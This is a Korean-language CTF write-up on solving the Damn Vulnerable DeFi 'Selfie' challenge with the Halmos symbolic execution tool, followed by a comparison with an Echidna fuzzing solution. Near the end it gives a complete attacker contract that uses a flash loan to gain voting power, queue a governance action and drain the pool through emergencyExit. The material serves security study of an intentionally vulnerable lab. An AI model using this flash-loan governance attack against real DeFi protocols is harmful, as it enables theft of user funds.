# Halmos vs Selfie

## Halmos 버전
이 글에서는 halmos 0.2.2.dev6+g27f620a 버전이 사용되었습니다.

## 서문
독자는 다음의 이전 글들에 익숙하다고 강력하게 가정합니다:
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)

주요 아이디어가 여기에서도 대부분 반복되므로 다시 설명하지 않습니다.

## 준비
### 공통 필수 조건
1. **Selfie.t.sol** 파일을 **SelfieHalmos.t.sol**로 복사합니다.
2. `test_selfie()`의 이름을 `check_selfie()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
3. `makeAddr()` 치트코드 사용을 피하십시오:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    ```
4. **GlobalStorage** 계약을 생성하고 계약의 주소-이름 쌍을 저장하십시오:
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(token), "DamnValuableVotes");
        glob.add_addr_name_pair(address(governance), "SimpleGovernance");
        glob.add_addr_name_pair(address(pool), "SelfiePool");
        ...
    ```
5. 모든 계약 주소를 출력하십시오:
    ```solidity
    function check_selfie() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    console.log("GlobalStorage\t", address(glob));
    console.log("token\t\t", address(token));
    console.log("governance\t", address(governance));
    console.log("pool\t\t", address(pool));
    console.log("attacker\t\t", address(attacker));
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
    ...
    [console.log] GlobalStorage 0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] token         0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] governance    0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] pool          0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] attacker      0x00000000000000000000000000000000000000000000000000000000aaaa0006
    ```
### _isSolved() 구현
원래 확인 로직은 다음과 같습니다:
```solidity
function _isSolved() private view {
    // Player has taken all tokens from the pool
    assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
    assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
}
```
따라서, 우리는 풀을 어느 정도 비우는 시나리오를 찾고 있습니다:
```solidity
function _isSolved() private view {
    assert (token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
}
```
## 커버리지 개선
하나의 심볼릭 트랜잭션을 실행하고 사소한 방법으로 코드 커버리지를 늘릴 수 있는지 주의 깊게 살펴봅시다:
```solidity
function attack() public {
    execute_tx();
    //execute_tx();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3 -vvvvv
```
리버트된 모든 경로 중에서 명백한 방법으로 우회할 수 있는 몇 가지를 강조할 수 있습니다.
### onFlashLoan
다음 몇 가지 경로를 고려하십시오:
```javascript
Path #67:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL SimpleGovernance::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```javascript
Path #68:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL 0xaaaa0003::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```javascript
Path #72:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL GlobalStorage::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```solidity
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
    external
    nonReentrant
    returns (bool)
{
    ...
    if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }
    ...
}    
```
여기서 무슨 일이 일어나고 있냐면: `selfiePool::flashLoan()`에서 우리는 `_receiver`를 매개변수로 전달합니다. 트랜잭션을 심볼릭하게 실행할 때, Halmos는 `_receiver`로서 자신에게 알려진 모든 주소를 무작위 대입하여 각 계약에서 `onFlashLoan()` 함수를 실행하려고 시도합니다. 우리는 [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/naive-receiver/README.md#optimizations)에서 비슷한 것을 보았습니다. 하지만 이번에는 설정에 준비된 **IERC3156FlashBorrower** 계약이 없으므로 현재 모든 `flashLoan` 트랜잭션은 **revert**될 운명입니다. 하지만 무섭지 않습니다. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/side-entrance/README.md#callbacks)에서 했던 것처럼 **SymbolicAttacker** 내부에서 그러한 콜백을 만들 수 있다는 것은 명백합니다:
```solidity
function onFlashLoan(address initiator, address token,
                    uint256 amount, uint256 fee,
                    bytes calldata data
) external returns (bytes32) 
{
    address target = svm.createAddress("target_onFlashLoan");
    bytes memory data;
    //구체적인 target-name 쌍 얻기
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call(data);
}
```
게다가 이번에는 이 flashLoan이 "정직하게" 반환되어야 한다는 점을 고려하십시오. 그리고 유효한 문자열을 반환해야 합니다:
```solidity
function flashLoan(...)
{
    ...
    if (!token.transferFrom(address(_receiver), address(this), _amount)) {
        revert RepayFailed();
    }
    ...
}
```
그래서, **SymbolicAttacker**:
```solidity
function onFlashLoan(...)
{
    ...
    DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1);
    return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
}
```
그리고 실제로, 유일한 `_receiver`는 **SymbolicAttacker**만 될 수 있다고 가정하여 솔버를 돕습니다:
```solidity
function flashLoan(...)
{
    vm.assume(address(_receiver) == address(0xaaaa0006)); // SymbolicAttacker
    ...
}
```
### executeAction
우리의 관심을 끌 만한 다음 리버트는 이것입니다:
```javascript
Path #46:
...
    CALL SimpleGovernance::executeAction(p_actionId_uint256_74c7dee_04())
    ↩ REVERT Concat(CannotExecute, p_actionId_uint256_74c7dee_04()) (error: Revert())
    ...
```
```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }
    ...
}
...
function _canBeExecuted(uint256 actionId) private view returns (bool) {
    GovernanceAction memory actionToExecute = _actions[actionId];

    if (actionToExecute.proposedAt == 0) return false;

    uint64 timeDelta;
    unchecked {
        timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
    }

    return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
}
```
이 리버트는 우리가 등록된 **action**을 전혀 가지고 있지 않았기 때문에 발생합니다. 1개의 트랜잭션 동안 심볼릭하게 여기에 들어갈 수 없었으므로, 최소한 2개가 필요하다고 가정합니다: 첫 번째는 **action**을 등록하고, 두 번째는 그것을 실행합니다. 또한 `block.timestamp`의 사용에 주목합니다. 이것은 트랜잭션 사이에 시간이 흘러야 한다는 분명한 표시입니다. **action**을 등록하는 방법을 모르기 때문에 이 시점에서는 이 코드를 직접 커버할 수 없습니다. 하지만 하나의 심볼릭 트랜잭션으로는 충분하지 않을 것임을 확실히 알고 있습니다.

따라서 **SymbolicAttacker**는 확장됩니다:
```solidity
function attack() public {
    execute_tx();
    uint256 warp = svm.createUint256("warp");
    vm.warp(block.timestamp + warp); // 트랜잭션 사이의 심볼릭 시간 대기
    execute_tx();
}
```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
Counterexample:
    halmos_selector_bytes4_0b23fde_25 = permit
    halmos_selector_bytes4_557bab0_51 = transferFrom
    ...
Killed
```
우리가 익숙한 가짜 [permit-transferFrom](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/truster/README.md#counterexamples-analysis) 반례를 고려하지 않는다면, 해결책은 여전히 발견되지 않았습니다. 게다가 메모리 부족(Out-of-memory)으로 완료되지도 않았습니다. 최적화가 필요합니다!

### 작은 업데이트
이 글을 쓰는 시점에서 "메모리 부족" 문제는 [수정](https://github.com/a16z/halmos/issues/425)되었습니다. 이제 메모리가 경로 수 증가에 따라 선형적으로 증가하지 않으므로, 적어도 어느 정도 시간 내에 2개의 심볼릭 트랜잭션을 완료할 수 있습니다. 그러나 12시간 정도 실행했지만 반례는 여전히 발견되지 않았습니다.

## 최적화 및 휴리스틱
우리는 이미 [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver#optimizations)에서 경로 폭발 한계에 부딪혔습니다. 그리고 이 한계를 우회하기 위해 적용할 수 있는 몇 가지 최적화 및 휴리스틱 방향을 이미 강조할 수 있습니다:
1. 결과에 영향을 미치지 않는 것으로 알려진 "확실한" 최적화를 추가합니다.
2. 일부 시나리오는 잘라낼 수 있지만 전체 코드 커버리지는 줄이지 않는 휴리스틱을 추가합니다.
3. 엔진의 작업을 더 쉽게 만들기 위해 불변 조건을 단순화/변경합니다.

각 요점을 살펴보겠습니다.
### 확실한 최적화
여기서 가장 먼저 생각나는 것은 `ERC20::permit`을 심볼릭 함수 후보에서 완전히 제외하는 것입니다. 이것은 이미 짜증나기 시작했습니다. `ERC20Votes::approve`가 적용 불가능한데 이것을 적용할 수 있는 시나리오가 생각나지 않습니다. `ERC20Votes::delegateBySig`도 비슷한 상황입니다. 우리는 동일한 모든 시나리오에서 적용할 수 있는 간단한 `ERC20Votes::delegate`를 가지고 있습니다.

따라서 **GlobalStorage**에서 심볼릭 호출 커버리지에서 전체 함수를 제외하는 새로운 기능을 구현하여 이들을 금지할 것입니다:
```solidity
contract GlobalStorage is Test, SymTest {
    constructor() {
        add_banned_function_selector(bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)")));
        add_banned_function_selector(bytes4(keccak256("delegateBySig(address,uint256,uint256,uint8,bytes32,bytes32)")));
    }
    ...
    mapping (uint256 => bytes4) banned_selectors;
    uint256 banned_selectors_size = 0;

    function add_banned_function_selector(bytes4 selector) public {
        banned_selectors[banned_selectors_size] = selector;
        banned_selectors_size++;
    }
    ...
    function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public 
                                        returns (address ret, bytes memory data) 
    {
    ...
        vm.assume(selector == bytes4(data));
        for (uint256 s = 0; s < banned_selectors_size; s++) {
            vm.assume(selector != banned_selectors[s]);
        }
        ...
    }
```
### 시나리오 자르기
동일한 함수에 심볼릭하게 여러 번 들어가는 시나리오를 줄여보겠습니다. 이제 경로의 `get_concrete_from_symbolic` 내부에서 동일한 함수를 두 번 선택할 수 없습니다. 동시에 코드의 전체 커버리지는 줄어들지 않으며, 이러한 함수가 한 번 들어가는 모든 시나리오를 여전히 통과할 것입니다:
```solidity
contract GlobalStorage is Test, SymTest {
    ...
    mapping (uint256 => bytes4) used_selectors;
    uint256 used_selectors_size = 0;
    ...
    function get_concrete_from_symbolic_optimized (...) 
    {
        ...
        for (uint256 s = 0; s < used_selectors_size; s++) {
            vm.assume(selector != used_selectors[s]);
        }
        used_selectors[used_selectors_size] = selector;
        used_selectors_size++;
        ...
    }
    ...
}
```
### onFlashLoan 확장
지금까지 우리는 'attack()'에서만 심볼릭 공격 트랜잭션의 수를 늘려왔습니다. 하지만 실제로 이것이 가능한 유일한 곳은 아닙니다. Halmos가 2개의 심볼릭 트랜잭션을 `attack()`에서 직접 처리하는 것은 꽤 어렵기 때문에, 대신 'onFlashLoan()' 콜백 내부에 또 다른 심볼릭 트랜잭션을 추가해 볼 수 있습니다. 이렇게 하면 여전히 2개의 심볼릭 트랜잭션을 처리하지만, **flashLoan**이 발생한 경우에만 해당됩니다. 이것은 우리가 커버하는 시나리오의 수를 크게 줄여 많은 자원을 절약해 줍니다:
```solidity
...
function execute_tx(string memory target_name) private {
        address target = svm.createAddress(target_name);
        bytes memory data;
        //구체적인 target-name 쌍 얻기
        (target, data) = glob.get_concrete_from_symbolic_optimized(target);
        target.call(data);
    }

    function onFlashLoan(address initiator, address token,
                        uint256 amount, uint256 fee,
                        bytes calldata data
    ) external returns (bytes32) 
    {
        execute_tx("onFlashLoan_target1");
        execute_tx("onFlashLoan_target2");
        DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // pool에 대한 무제한 승인
        return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }
...
function attack() public {
    execute_tx("attack_target");
    /*uint256 warp = svm.createUint256("warp");
    vm.warp(block.timestamp + warp); // 트랜잭션 사이의 심볼릭 시간 대기
    execute_tx();*/
}
```
그리고 지금은 `vm.warp()` 로직을 포기합시다. 사실 우리는 하나의 공격 심볼릭 트랜잭션만 실행하고 있지만, 나중에 필요할 수도 있다는 것을 명심합시다.
### 불변 조건
지금까지는 문제의 초기 조건에서 어떻게든 뒤따르는 불변 조건만 사용했습니다. 이번에는 훨씬 더 창의적인 방식으로 가서 예상치 못하거나 부자연스럽거나 버그가 있는 것처럼 보이는 시나리오를 생각해 볼 것을 제안합니다. 네, 이 계약들의 가상의 개발자들을 위해 일을 대신 해주고 테스트로 커버해 봅시다 :D.

토큰 **allowance(승인)**부터 시작해 봅시다. **SymbolicAttacker**의 행동 결과로 `pool`이나 `governance`의 allowance가 어떻게든 변경될 수 있다는 것은 예상 밖입니다:
```solidity
function _isSolved() private view {
    ...
    // Check allowance changes
    address symbolicSpender = svm.createAddress("symbolicSpender");
    assert (token.allowance(address(pool), symbolicSpender) == 0);
    assert (token.allowance(address(governance), symbolicSpender) == 0);
    ...
}
```
**simpleGovernance** 계약에서 `_votingToken`은 불변(immutable)이 아닙니다:
```solidity
contract SimpleGovernance is ISimpleGovernance {
    ...
    DamnValuableVotes private _votingToken;
    ...
}
```
어쩌면 그것을 어떻게든 변경할 수 있는 시나리오가 있을지도 모릅니다:
```solidity
function _isSolved() private view {
    ...
    //check if governance's _votingToken may be changed
    assert (governance._votingToken() == token);
    ...
}
```

그리고 위에서 이미 이야기했던 것입니다. `attacker`가 어떤 **action**을 등록할 수 있는 시나리오가 있을 수 있다는 것은 예상 밖입니다:
```solidity
function _isSolved() private view {
    ...
    // Check number of registered actions
    assert (governance._actionCounter() == 1);
    ...
}
```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
Counterexample:
halmos_attack_target_address_76088a0_01 = 0x00000000000000000000000000000000aaaa0005
halmos_onFlashLoan_target1_address_e2e23e2_11 = 0x00000000000000000000000000000000aaaa0003
halmos_onFlashLoan_target2_address_96959d6_37 = 0x00000000000000000000000000000000aaaa0004
halmos_onFlashLoan_warp_uint256_3e01f3b_36 = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe
halmos_selector_bytes4_1324286_10 = flashLoan
halmos_selector_bytes4_9ca1d33_35 = delegate
halmos_selector_bytes4_e371046_45 = queueAction
halmos_symbolicSpender_address_979144d_46 = 0x0000000000000000000000000000000000000000
p__amount_uint256_5941bda_07 = 0x00000000000000000000000000000000000000000000ffe33bfeffedf1800001
p__data_length_a72e3db_09 = 0x0000000000000000000000000000000000000000000000000000000000000000
p__receiver_address_669827c_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p__token_address_46b250b_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_data_length_77de601_44 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_delegatee_address_e1aa274_16 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p_target_address_188b5bf_41 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint128_14d3e47_42 = 0x0000000000000000000000000000000000000000000000000000000000000000
[FAIL] check_selfie() (paths: 7080, time: 948.98s, bounds: [])
```
멋집니다! 경로 수를 ~7000개로 줄였고, `attacker`가 **action**을 등록할 수 있는 시나리오를 찾았습니다: 우리는 `flashLoan()`을 통해 토큰을 빌리고, 그것을 자신에게 `delegate()`하고, **action**을 등록한 다음, 대출을 상환합니다. 또한, 우리는 `executeAction()`으로 가는 경로를 "잠금 해제"했습니다! 그리고 사실, 여기서는 아직 warp가 필요하지 않았습니다. 좋습니다.

하지만 이 버그를 사용하여 풀을 비우는 방법은 아직 명확하지 않습니다. 따라서 여행은 계속됩니다.
## SymbolicAttacker 프리로드(Preload)
이제 `attacker.attack()`을 실행하기 전에, 이전 섹션에서 찾은 버그를 사용하여 **action**을 등록할 것입니다. 하지만 정확히 어떤 **action**일까요? 그것을 심볼릭하게 만들고 나중에 솔버가 알아내도록 합시다.
```solidity
function check_selfie() public checkSolvedByPlayer {
    ...
    attacker.preload();
    uint256 warp = svm.createUint256("preattack_warp");
    vm.warp(block.timestamp + warp); // 트랜잭션 사이의 심볼릭 시간 대기
    attacker.attack();
}
```
```solidity
function onFlashLoan(address initiator, address token,
                    uint256 amount, uint256 fee,
                    bytes calldata data
) external returns (bytes32) 
{
    if (is_preload) {
        DamnValuableVotes(token).delegate(address(this));
        SimpleGovernance governance = SimpleGovernance(address(0xaaaa0004));
        address target = svm.createAddress("preload_onFlashLoan_target");
        uint256 value = svm.createUint256("preload_onFlashLoan_value");
        bytes memory data = svm.createBytes(1000, "preload_onFlashLoan_data");
        governance.queueAction(target, uint128(value), data);
    }
    else {
        execute_tx("onFlashLoan_target");
    }
    DamnValuableVotes(token).approve(address(msg.sender), type(uint256).max); // pool에 대한 무제한 승인
    return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
}

function preload(SelfiePool pool, DamnValuableVotes token) public {
    is_preload = true;
    bytes memory data = svm.createBytes(1000, "preload_data");
    uint256 amount = svm.createUint256("preload_amount");
    pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    is_preload = false;
}
...
```
`_actionCounter`의 불변성에 대한 assert를 제거하는 것을 잊지 마십시오. 그렇지 않으면 모든 경로가 반례가 될 것입니다:
```solidity
function _isSolved() private view {
    ...
    // Check number of registered actions
    //assert (governance._actionCounter() == 1);
}
```
`executeAction` 함수를 잠금 해제했으므로, 다시 하나의 심볼릭 트랜잭션으로 시작해 봅시다. 그것으로 충분한지 보겠습니다.

실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
WARNING  Encountered symbolic memory offset: 320 + Concat(...)
...
```
여기서 문제는 다음과 같습니다:
```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
...
GovernanceAction storage actionToExecute = _actions[actionId];
...
```
분명히, 우리는 단 하나의 action만 가지고 있습니다. `assume`을 자유롭게 사용하십시오:
```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
    vm.assume(actionId == 1);
    ...
```
또한 이 시점에서 재귀가 발생합니다. **SymbolicAttacker**의 일부 함수가 대상으로 실행될 수 있기 때문입니다.
그러한 시나리오를 제거합니다:
```solidity
vm.assume(actionToExecute.target != address(0xaaaa0006)); // SymbolicAttacker가 아님
return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
```
다시 실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
Counterexample:
    halmos_attack_target_address_ba23df8_07 = 0x00000000000000000000000000000000aaaa0004
    halmos_preattack_warp_uint256_072067d_06 = 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    halmos_preload_amount_uint256_187eee1_02 = 0x00000000000000000000000000000000000000000000ffe33bfeffedf1800001
    halmos_preload_onFlashLoan_data_bytes_a4fe5da_05 = 0xa441d06700000000000000000000000000000000000000000000000000000000aaaa000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    halmos_preload_onFlashLoan_target_address_1ccd7a9_03 = 0x00000000000000000000000000000000aaaa0005
    halmos_preload_onFlashLoan_value_uint256_251117f_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_selector_bytes4_b526f44_15 = executeAction
    p_actionId_uint256_b6a16cb_10 = 0x0000000000000000000000000000000000000000000000000000000000000001     
```
이번에는 프리로드 단계를 추가했기 때문에 무슨 일이 일어났는지 따라가기가 조금 어렵지만, 전반적으로 명확합니다: 우리의 **action**이 `pool`에서 `emergencyExit()`를 실행하여, 그것을 비웠습니다. 공격 시나리오가 발견되었습니다!
## 반례 사용
공격자 계약:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {Test, console} from "forge-std/Test.sol";

contract Attacker {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function onFlashLoan(address initiator, address token,
                        uint256 amount, uint256 fee,
                        bytes calldata data
    ) external returns (bytes32) 
    {
        DamnValuableVotes(token).delegate(address(this));
        address target = address(pool);
        uint128 value = 0;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        governance.queueAction(target, value, data);
        DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // pool에 대한 무제한 승인
        return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }

    function preload() public {
        bytes memory data = "";
        uint256 amount = 0xffe33bfeffedf1800001;
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    }

    function attack() public {
        governance.executeAction(1);
    }
}
```
테스트:
```solidity
function test_selfie() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(token, governance, pool, recovery);
    attacker.preload();
    vm.warp(block.timestamp + 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
    attacker.attack();
}
```
실행:
```javascript
$ forge test --mp test/selfie/Selfie.t.sol
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 11.95ms (1.46ms CPU time)
```
성공!
## 퍼징 vs Selfie
퍼징 테스트를 위해 이 챌린지 계약들을 준비할 필요가 없어서 너무 기쁩니다. **Crytic 팀**은 이미 Echidna를 사용하여 이 문제에 대한 기성 솔루션(Damn Vulnerable Defi V3)을 [여기](https://github.com/crytic/damn-vulnerable-defi-echidna/blob/solutions/contracts/selfie/EchidnaSelfie.sol)에 보유하고 있습니다. 그들의 솔루션을 자세히 분석하기 전에, 미리 말하자면 이것은 현재 그러한 사소하지 않은 공격의 경우에 Halmos와 Echidna의 계약 준비 접근 방식 차이를 보여주는 가장 생생한 예입니다. 그리고 저는 여기서 수행된 작업에 정말 깊은 인상을 받았습니다. 그들이 여기서 Echidna를 작동하게 만들었다는 사실은 존경받을 만합니다!
### 버전 차이
DVD V3와 V4에서 챌린지의 본질은 동일한 버그와 함께 유지되었습니다. 그러나 주요 함수 이름과 토큰 로직에 몇 가지 차이점이 있습니다:
1. V3에서 `emergencyExit()` 함수는 `drainAllFunds()`라고 불립니다.
2. `onFlashLoan()` 함수는 `receiveTokens()`라고 불립니다.
3. `ERC20Votes::delegate()` 대신 `snapshot()`을 통한 로직이 사용됩니다.

### 아이디어 개요
아이디어를 간략하게 설명하자면: 공격자가 호출할 수 있는 소수의 함수가 추상화 없이 코드에 직접 설명되어 있는 "괴물 같은" [push-pop-use](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/the-rewarder/README.md#analysis-of-the-limits-of-echidna) 패턴이 있습니다. 처음 몇 번의 호출은 공격 트랜잭션에 의해 호출될 함수들을 "설정(setup)"하는 것입니다.
### 시나리오 수 감소
Halmos 솔루션과 마찬가지로 Echidna 기반 솔루션은 다루는 시나리오의 수를 줄였습니다. 그러나 중요한 차이점이 있습니다: 기본적으로 그들은 다음 대상 함수들만 고려합니다:
```solidity
enum CallbackActions {
    drainAllFunds,
    transferFrom,
    queueAction,
    executeAction
}
```
동시에, Halmos에서 작업할 때 최적화 중에 우리는 커버해야 할 전체 함수를 잘라내지 않았습니다.

예를 들어 `ERC20::transfer()`를 확인하지 않는 이유를 이해합니다. 그렇지 않으면 코드가 훨씬 더 비대해질 것입니다. 나중에 자세히 다루겠습니다. 그럼에도 불구하고 제 생각에 이것은 이미 퍼저에게 매우 큰 힌트입니다.
### 설정(setup)
그럼 Echidna가 공격 중에 어떤 함수를 실행할지 어떻게 결정하는지 알아봅시다.

이러한 함수의 식별자가 기록되는 배열이 있습니다:
```solidity
uint256[] private callbackActionsToBeCalled;
```
그리고 본질적으로 ID를 이 배열에 푸시하는 4개의 함수가 있습니다:
```solidity
...
function pushDrainAllFundsToCallback() external {
    callbackActionsToBeCalled.push(uint256(CallbackActions.drainAllFunds));
}
...
function pushTransferFromToCallback(uint256 _amount) external {
    require(_amount > 0, "Cannot transfer zero tokens");
    _transferAmountInCallback.push(_amount);
    callbackActionsToBeCalled.push(uint256(CallbackActions.transferFrom));
}
...
function pushQueueActionToCallback(
    uint256 _weiAmount,
    uint256 _payloadNum,
    uint256 _amountToTransfer
) external {
    require(
        address(this).balance >= _weiAmount,
        "Not sufficient account balance to queue an action"
    );
    if (_payloadNum == uint256(PayloadTypesInQueueAction.transferFrom)) {
        require(_amountToTransfer > 0, "Cannot transfer 0 tokens");
    }
    // 콜백 배열에 액션 추가
    callbackActionsToBeCalled.push(uint256(CallbackActions.queueAction));
    // 페이로드 매핑 업데이트
    payloads[payloadsPushedCounter].weiAmount = _weiAmount;
    // 페이로드 생성
    createPayload(_payloadNum, _amountToTransfer);
}
...
function pushExecuteActionToCallback() external {
    callbackActionsToBeCalled.push(uint256(CallbackActions.executeAction));
}
```
여기서 `queueAction()` 푸시의 일부로 수행되는 `createPayload()` 함수도 설명할 가치가 있습니다. Echidna가 대상 및 콜데이터로 전달되는 함수를 실행하는 데 능숙하지 않다는 것을 이미 알고 있으므로, 어떻게든 우회해야 합니다:
```solidity
// Echidna에 의해 생성된 주어진 페이로드와 관련된 데이터를 저장하기 위해
struct QueueActionPayload {
    uint256 payloadIdentifier; // createPayload -> 로깅 목적
    bytes payload; // createPayload
    address receiver; // createPayload
    uint256 weiAmount; // pushQueueActionToCallback
    uint256 transferAmount; // createPayload -> payloadIdentifier == uint256(PayloadTypesInQueueAction.transferFrom)인 경우에만 사용됨
}
// 생성된 페이로드의 내부 카운터
mapping(uint256 => QueueActionPayload) payloads;
...
function createPayload(
    uint256 _payloadNum,
    uint256 _amountToTransfer
) internal {
    // 최적화: 유효한 페이로드만 생성하기 위해 _payloadNum을 좁힘
    _payloadNum = _payloadNum % payloadsLength;
    // 페이로드 매핑에 이미 푸시된 페이로드 카운터 캐시
    uint256 _counter = payloadsPushedCounter;
    // 페이로드 식별자 저장
    payloads[_counter].payloadIdentifier = _payloadNum;
    // 페이로드 변수 초기화
    bytes memory _payload;
    address _receiver;
    // 선택된 경우 drainAllFunds 함수의 페이로드 생성
    if (_payloadNum == uint256(PayloadTypesInQueueAction.drainAllFunds)) {
        _payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        _receiver = address(pool);
    }
    // 선택된 경우 transferFrom 함수의 페이로드 생성
    if (_payloadNum == uint256(PayloadTypesInQueueAction.transferFrom)) {
        // _transferAmountInPayload.push(_amountToTransfer);
        _payload = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            address(pool),
            address(this),
            _amountToTransfer
        );
        _receiver = address(token);
        // 전송할 금액 저장
        payloads[_counter].transferAmount = _amountToTransfer;
    }
    // 생성된 변수로 페이로드 매핑 채우기
    payloads[_counter].payload = _payload;
    payloads[_counter].receiver = _receiver;
    // 페이로드 카운터 증가 (다음 반복의 새 페이로드 생성을 위해)
    ++payloadsPushedCounter;
}
```
